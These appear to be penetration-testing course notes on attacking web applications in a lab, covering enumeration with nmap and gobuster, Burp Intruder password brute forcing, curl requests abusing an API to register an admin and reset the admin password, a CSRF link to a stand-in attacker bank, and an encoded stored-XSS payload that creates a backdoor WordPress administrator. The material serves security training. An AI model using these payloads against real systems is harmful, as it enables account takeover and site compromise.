## Web Application Attacks

**Start web application enumeration from its core component, the web server, since this is the common denominator of any web application that exposes its services.**

Since we found port 80 open on our target, we can proceed with service discovery. To get started, we'll rely on the nmap service scan (-sV) to grab the web server (-p80) banner.
```bash
kali@kali:~$ sudo nmap -p80  -sV 192.168.50.20
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 05:13 EDT
Nmap scan report for 192.168.50.20
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
Our scan shows that Apache version 2.4.41 is running on the Ubuntu host.

To take our enumeration further, we use service-specific Nmap NSE scripts, like http-enum, which performs an initial fingerprinting of the web server.
```bash
kali@kali:~$ sudo nmap -p80 --script=http-enum 192.168.50.20
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 06:30 EDT
Nmap scan report for 192.168.50.20
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /login.php: Possible admin folder
|   /db/: BlogWorx Database
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /db/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds
```

We can also passively fetch a wealth of information about the application technology stack via Wappalyzer.

**Once we have discovered an application running on a web server, our next step is to map all its publicly-accessible files and directories.**

To do this, we would need to perform multiple queries against the target to discover any hidden paths. 

### Gobuster

Can generate a lot of traffic, so not helpful if you need to stay under the radar

Gobuster supports different enumeration modes, including fuzzing and dns. The default running threads are 10; we can reduce the amount of traffic by setting a lower number via the -t parameter.
```bash
kali@kali:~$ gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.20
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/30 05:16:21 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://192.168.50.20/css/]
/db                   (Status: 301) [Size: 311] [--> http://192.168.50.20/db/]
/images               (Status: 301) [Size: 315] [--> http://192.168.50.20/images/]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/js                   (Status: 301) [Size: 311] [--> http://192.168.50.20/js/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.50.20/uploads/]

===============================================================
2022/03/30 05:18:08 Finished
===============================================================
```


### Burp Suite

Let's start with the Proxy tool. In general terms, a web proxy is any dedicated hardware or software meant to intercept requests and/or responses between the web client and the web server. This allows administrators and testers alike to modify any requests that are intercepted by the proxy, both manually and automatically.

Some web proxies are employed to intercept company-wide TLS traffic. Known as TLS inspection devices, these perform decryption and re-encryption of the traffic and thus nullify any privacy layer provided by the HTTPS protocol.

**With the Burp Proxy tool, we can intercept any request sent from the browser before it is passed on to the server. We can change almost anything about the request at this point, such as parameter names or form values. We can even add new headers. This lets us test how an application handles unexpected arbitrary input. For example, an input field might have a size limit of 20 characters, but we could use Burp Suite to modify a request to submit 30 characters.**

- When Intercept is enabled, we have to manually click on Forward to send each request to its destination. 

- Alternatively, we can click Drop to not send the request. 

- The Options sub-tab shows what ports are listening for proxy requests.

- By default, Burp Suite enables a proxy listener on localhost:8080. This is the host and port that our browser must connect to in order to proxy traffic through Burp Suite

In our case, the proxy (Burp) and the browser reside on the same host, so we'll use the loopback IP address 127.0.0.1 and specify port 8080. (Set Firefox Proxy in Network Settings)

In some testing scenarios, we might want to capture the traffic from multiple machines, so the proxy will be configured on a standalone IP. In such cases, we will configure the browser with the external IP address of the proxy.

Why does "detectportal.firefox.com" keep showing up in the proxy history? A captive portal is a web page that serves as a sort of gateway page when attempting to browse the Internet. It is often displayed when accepting a user agreement or authenticating through a browser to a Wi-Fi network. To ignore this, simply enter about:config in the address bar. Firefox will present a warning, but we can proceed by clicking I accept the risk!. Finally, search for "network.captive-portal-service.enabled" and double-click it to change the value to "false". This will prevent these messages from appearing in the proxy history.

**Repeater is another fundamental Burp tool. With the Repeater, we can craft new requests or easily modify the ones in History, resend them, and review the responses. To observe this in action, we can right-click a request from Proxy > HTTP History and select Send to Repeater.**

**Intruder is another essential Burp feature, as its name suggests, is designed to automate a variety of attack angles, from the simplest to more complex web application attacks.**

First, we'll need to configure our local Kali's hosts file to statically assign the IP to the offsecwp website we are going to test.
```bash
kali@kali:~$ cat /etc/hosts 

...
192.168.50.16 offsecwp
```


We can now select the Intruder tab in the upper bar, choose the POST request we want to modify, and move to the Positions sub-tab. Knowing that the user admin is correct, we only need to brute force the password field. First, we'll press Clear on the right bar so that all fields are cleared. We can then select the value of the pwd key and press the Add button on the right.

We have now instructed the Intruder to modify only the password value on each new request. Before starting our attack, let's provide Intruder with a wordlist. Knowing that the correct password is "password", we can grab the first 10 values from the rockyou wordlist on Kali.
```bash
kali@kali:~$ cat /usr/share/wordlists/rockyou.txt | head
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```
Moving to the Payloads sub-tab, we can paste the above wordlist into the Payload Options[Simple list] area.

With everything ready to start the Intruder attack, let's click on the top right Start Attack button.

We can move past the Burp warning about restricted Intruder features, as this won't impact our attack. After we let the attack complete, we can observe that apart from the initial probing request, it performed 10 requests, one for each entry in the provided wordlist.

The WordPress application replied with a different Status code on the 4th request, hinting that this might be the correct password value. Our hypothesis is confirmed once we try to log in to the WordPress administrative console with the discovered password.

Some extensions, like .php, are straightforward, but others are more cryptic and vary based on the frameworks in use. For example, a Java-based web application might use .jsp, .do, or .html.

File extensions on web pages are becoming less common, however, since many languages and frameworks now support the concept of routes, which allow developers to map a URI to a section of code. Applications leveraging routes use logic to determine what content is returned to the user, making URI extensions largely irrelevant.

The **Firefox Debugger tool** (found in the Web Developer menu) displays the page's resources and content, which varies by application. The Debugger tool may display JavaScript frameworks, hidden input fields, comments, client-side controls within HTML, JavaScript, and much more.

If the code is written in jQuery, prettify the code for greater readability.

The debugger will also reveal HTTP headers, response headers, server information, etc.

The names or values in the response header often reveal additional information about the technology stack used by the application. Some examples of non-standard headers include X-Powered-By, x-amz-cf-id, and X-Aspnet-Version. Further research into these names could reveal additional information, such as that the "x-amz-cf-id" header indicates the application uses Amazon CloudFront.

Sitemaps are another important element we should take into consideration when enumerating web applications. Web applications can include sitemap files to help search engine bots crawl and index their sites.  These files also include directives of which URLs not to crawl - typically sensitive pages or administrative consoles, which are exactly the sort of pages we are interested in.

Inclusive directives are performed with the sitemaps protocol, while robots.txt excludes URLs from being crawled. For example, we can retrieve the robots.txt file from
www.google.com with curl:
```bash
kali@kali:~$ curl https://www.google.com/robots.txt
User-agent: *
Disallow: /search
Allow: /search/about
Allow: /search/static
Allow: /search/howsearchworks
Disallow: /sdch
Disallow: /groups
Disallow: /index.html?
Disallow: /?
Allow: /?hl=
...
```

Sitemap files should not be overlooked because they may contain clues about the website layout or other interesting information, such as yet-unexplored portions of the target.

API paths are often followed by a version number, resulting in a pattern such as "/api_name/v1"

With this information, let's try brute forcing the API paths using a wordlist along with the pattern Gobuster feature. We can call this feature by using the -p option and providing a file with patterns. For our test, we'll create a simple pattern file on our Kali system containing the following text:
```bash
{GOBUSTER}/v1
{GOBUSTER}/v2
```
(In reality, use more versions.)
```bash
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Patterns:                pattern (1 entries)
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
===============================================================
/books/v1             (Status: 200) [Size: 235]
/console              (Status: 200) [Size: 1985]
/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
/users/v1             (Status: 200) [Size: 241]
```
Use GoBuster iteratively on interesting directories.

Let's craft our request by first passing the admin username and dummy password as JSON data via the -d parameter. We'll also specify "json" as the "Content-Type" by specifying a new header with -H.
```bash
kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}
```
The API return message shows that the authentication failed, meaning that the API parameters are correctly formed.
Try creating an attack.
```bash
kali@kali:~$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

{ "status": "fail", "message": "'email' is a required property"}
```
We could take this opportunity to determine if there's any administrative key we can abuse. Let's add  he admin key, followed by a True value.
```bash
kali@kali:~$curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```
Let's try to log in with the credentials we just created by invoking the login API we discovered earlier.
```bash
kali@kali:~$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
```
 To obtain tangible proof that we are an administrative user, we should use this token to change the admin user password. We can attempt this by forging a POST request that targets the password API.
 ```bash
kali@kali:~$ curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```
We passed the JWT key inside the Authorization header along with the new password. Sadly, the application states that the method used is incorrect, so we need to try another one. The PUT method (along with PATCH) is often used to replace a value as opposed to creating one via a POST request, so let's try to explicitly define it next:
```bash
kali@kali:~$ curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```
This time we received no error message, so we can assume that no error was thrown by the application backend logic.
```bash
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
```
We can replicate the latest admin login attempt and send it to the proxy by appending the --proxy 127.0.0.1:8080 to the command . Once done, from Burp's Repeater tab, we can create a new empty request and fill it with the same data as we did previously.

### XSS

Cross-Site Scripting (XSS) is a vulnerability that exploits a user's trust in a website by dynamically injecting content into the page rendered by the user's browser.

XSS vulnerabilities can be **stored** or **reflected**.

**Stored XSS attacks**, also known as **Persistent XSS**, occur when the exploit payload is stored in a database or otherwise cached by a server. The web application then retrieves this payload and displays it to anyone who visits a vulnerable page. A single Stored XSS vulnerability can therefore attack all site users. Stored XSS vulnerabilities often exist in forum software, especially in comment sections, in product reviews, or wherever user content can be stored and reviewed later.

**Reflected XSS attacks** usually include the payload in a crafted request or link. The web application takes this value and places it into the page content. This XSS variant only attacks the person submitting the request or visiting the link. Reflected XSS vulnerabilities can often occur in search fields and results, as well as anywhere user input is included in error messages.

Either of these two vulnerability variants can manifest as client (browser) or server-side; they can also be DOM-based.

DOM-based XSS can be stored or reflected; the key is that DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed.

No matter how the XSS payload is delivered and executed, the injected scripts run under the context of the user visiting the affected page. This means that the user's browser, not the web application, executes the XSS payload. These attacks can be nevertheless significant, with impacts including session hijacking, forced redirection to malicious pages, execution of local applications as that user, or even trojanized web applications. 

JavaScript's role is to access and modify the page's DOM, resulting in a more interactive user experience. From an attacker's perspective, this also means that if we can inject JavaScript code into the application, we can access and modify the page's DOM. With access to the DOM, we can redirect login forms, extract passwords, and steal session cookies.

You can test XSS within the Console and retrieve the output, by printing values to the browser's console, seeing if input field's except unsanitized output (such as < > ' " { } ;), inserting an 'alert()' method, etc.

With Burp configured as a proxy and Intercept disabled, we can start our attack by first browsing to http://website/ using Firefox. We'll then go to Burp Proxy > HTTP History, right-click on the request, and select Send to Repeater.Moving to the Repeater tab, we can replace the default User-Agent value with the a script tag that includes the alert method (<script>alert(42)</script>), then send the request. If the server responds with a 200 OK message, we should be confident that our payload is now stored in the WordPress database. To verify this, let's log in to the admin console at http://offsecwp/wp-login.php using the admin/password credentials. If we navigate to the Visitors plugin console at http://website/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php, we are greeted with a pop-up banner showing the number 42, proving that our code injection worked.

Cookies can be set with several optional flags, including two that are particularly interesting to us as penetration testers: Secure and HttpOnly.

The Secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS.

The HttpOnly flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.

You can look at the nature of a website's cookies in the *Developer Tools*. If WordPress website, consider creating a JS script that creates another admin, 'https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/'.

First, we'll create a JS function that fetches the WordPress admin nonce. The nonce is a server-generated token that is included in each HTTP request to add randomness and prevent Cross-Site-Request-Forgery (CSRF) attacks. A CSRF attack occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalf of the user. The malicious link could be disguised by an apparently-harmless description, often luring the victim to click on it.
```bash
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>
```
This attack would be successful if the user is already logged in with a valid session on the same website.

As mentioned, in order to perform any administrative action, we need to first gather the nonce. We can accomplish this using the following JavaScript function:
```bash
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
This function performs a new HTTP request towards the /wp-admin/user-new.php URL and saves the nonce value found in the HTTP response based on the regular expression. The regex pattern matches any alphanumeric value contained between the string /ser" value=" and double quotes.

Now that we've dynamically retrieved the nonce, we can craft the main function responsible for creating the new admin user.
```bash
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
We created a new backdoored admin account, just after the nonce we obtained previously. If our attack succeeds, we'll be able to gain administrative access to the entire WordPress installation.

To ensure that our JavaScript payload will be handled correctly by Burp and the target application, we need to first minify it, then encode it. You can minify our attack with 'https://jscompress.com'.

As a final attack step, we are going to encode the minified JavaScript code, so any bad characters won't interfere with sending the payload. We can do this using the following function:
```bash
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
We are going to decode and execute the encoded string by first decoding the string with the fromCharCode method, then running it via the eval()[377] method. Once we have copied the encoded string, we can insert it with the following curl command and launch the attack:
```bash
kali@kali:~$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```
Before running the curl attack command, let's start Burp and leave Intercept on. We instructed curl to send a specially-crafted HTTP request with a User-Agent header containing our malicious payload, then forward it to our Burp instance so we can inspect it further. After running the curl command, we can inspect the request in Burp.

If everything seems correct, forward the request by clicking Forward, then disabling Intercept.

We notice that only one entry is present, and apparently no User-Agent has been recorded. This is because the User-Agent field contained our attack embedded into "\<script>" tags, so the browser cannot render any string from it. By loading the plugin statistics, we should have executed the malicious script, so let's verify if our attack succeeded by clicking on the Users menu on the left panel.

We could now advance our attack and gain access to the underlying host by crafting a custom WordPress plugin with an embedded web shell.